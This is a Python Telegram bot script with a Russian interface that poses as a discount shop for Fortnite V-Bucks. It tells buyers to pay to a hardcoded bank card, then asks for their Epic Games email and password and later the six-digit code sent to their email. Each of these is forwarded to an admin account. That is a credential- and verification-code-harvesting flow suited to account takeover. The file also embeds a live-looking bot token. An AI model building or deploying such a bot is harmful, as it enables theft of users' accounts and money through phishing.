import telebot
from telebot import types
from keep_alive import keep_alive

bot = telebot.TeleBot('7648138016:AAEdxB80G3W1gAyzepbVQmAD tyQGThk FQMM')# Замените на свой токен
ADMIN_ID = 5263048623  # Замените на ваш ID
feedbacks = {}
user_states = {}

prices = {
    "1000 V-Bucks": 600,
    "2000 V-Bucks": 1100,
    "2800 V-Bucks": 1400,
    "3000 V-Bucks": 1800,
    "3800 V-Bucks": 2000,
    "4000 V-Bucks": 2200,
    "5000 V-Bucks": 2500,
    "6000 V-Bucks": 3200,
    "7000 V-Bucks": 4300,
    "7800 V-Bucks": 4650,
    "13500 V-Bucks": 5600,
    "27000 V-Bucks": 11000,
    "40500 V-Bucks": 16000,
    "54000 V-Bucks": 25000,
    "108000 V-Bucks": 50000
}

def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("/start", "Отзывы")  # /start — первая
    for item in prices:
        markup.add(item)
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "Привет! Выбери количество V-Bucks, а также ты можешь посмотреть отзывы.", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text in prices)
def handle_selection(message):
    amount = message.text
    price = prices[amount]
    bot.send_message(message.chat.id, f"{amount} стоит {price}₽.\nОплата оплата по номеру карты: 2200700536853491\nПосле, отправьте скрин оплаты.")

@bot.message_handler(content_types=['photo'])
def handle_payment_photo(message):
    bot.send_message(message.chat.id, "Скрин получен. Теперь отправьте почту и пароль от аккаунта Epic Games.")
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    user_states[message.from_user.id] = "waiting_credentials"

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "waiting_credentials")
def handle_credentials(message):
    bot.send_message(message.chat.id, "Спасибо! Ваши данные отправлены администратору.")
    bot.send_message(ADMIN_ID, f"Данные от @{message.from_user.username or 'Без ника'}: {message.text}")

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Запросить 6-значный код", callback_data=f"request_code_{message.from_user.id}"))
    bot.send_message(ADMIN_ID, "Нажмите, чтобы запросить 6-значный код у пользователя:", reply_markup=markup)

    user_states[message.from_user.id] = "waiting_code_request"

@bot.callback_query_handler(func=lambda call: call.data.startswith("request_code_"))
def request_code_from_user(call):
    if call.from_user.id != ADMIN_ID:
        return

    user_id = int(call.data.split("_")[2])
    bot.send_message(user_id, "Вам пришёл запрос: введите 6-значный код, который пришёл на почту.")
    user_states[user_id] = "waiting_code"

@bot.message_handler(func=lambda m: m.text.isdigit() and len(m.text) == 6 and user_states.get(m.from_user.id) == "waiting_code")
def receive_user_code(message):
    bot.send_message(message.chat.id, "Код получен. Ожидайте выполнения заказа.")
    bot.send_message(ADMIN_ID, f"6-значный код от @{message.from_user.username or 'Без ника'}: {message.text}")

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Выполнил заказ ✅", callback_data=f"done_{message.from_user.id}"))
    bot.send_message(ADMIN_ID, "Нажмите, когда выполните заказ:", reply_markup=markup)

    user_states[message.from_user.id] = "code_received"

@bot.callback_query_handler(func=lambda call: call.data.startswith("done_"))
def send_confirm_button(call):
    if call.from_user.id != ADMIN_ID:
        return

    user_id = int(call.data.split("_")[1])
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("Подтвердить выполнение заказа ✅", callback_data=f"confirm_{user_id}"))
    bot.send_message(user_id, "Ваш заказ выполнен! Подтвердите выполнение заказа.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("confirm_"))
def confirm_delivery(call):
    user_id = int(call.data.split("_")[1])
    if call.from_user.id != user_id:
        return
    bot.send_message(user_id, "Спасибо за покупку! Пожалуйста, оставьте свой отзыв.")
    user_states[user_id] = "awaiting_feedback"

@bot.message_handler(func=lambda m: user_states.get(m.from_user.id) == "awaiting_feedback")
def save_feedback(message):
            feedbacks[message.from_user.id] = {
                "username": message.from_user.username or "Без ника",
                "text": message.text
            }
            bot.send_message(message.chat.id, "Спасибо за отзыв!")
            user_states[message.from_user.id] = None

@bot.message_handler(func=lambda m: m.text == "Отзывы")
def show_reviews(message):
            if not feedbacks:
                bot.send_message(message.chat.id, "Пока нет отзывов.")
                return

            text = "\n\n".join([f"От @{f['username']}:\n{f['text']}" for f in feedbacks.values()])
            bot.send_message(message.chat.id, text)

            if message.from_user.id == ADMIN_ID:
                markup = types.InlineKeyboardMarkup()
                for uid, f in feedbacks.items():
                    markup.add(types.InlineKeyboardButton(f"Удалить отзыв от @{f['username']}", callback_data=f"del_{uid}"))
                bot.send_message(message.chat.id, "Удаление отзывов:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("del_"))
def delete_review(call):
            if call.from_user.id != ADMIN_ID:
                return
            user_id = int(call.data.split("_")[1])
            if feedbacks.pop(user_id, None):
                bot.send_message(call.message.chat.id, "Отзыв удалён.")
            else:
                bot.send_message(call.message.chat.id, "Отзыв не найден.")

    # Запускаем keep_alive, чтобы поддерживать активность бота
keep_alive()
bot.polling(none_stop=True)  # используем polling, без webhook
